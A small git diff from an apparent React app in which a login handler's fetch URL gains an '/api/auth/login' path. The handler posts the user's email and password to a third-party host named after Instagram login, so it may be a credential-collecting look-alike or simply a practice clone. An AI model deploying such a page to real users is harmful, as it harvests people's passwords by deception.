@@ -8,7 +8,7 @@ function App() {
 
   const handleLogin = async (e) => {
     e.preventDefault();
-    const response = await fetch('https://instagramlogin-mongodb.onrender.com', {
+    const response = await fetch('https://instagramlogin-mongodb.onrender.com/api/auth/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password }),
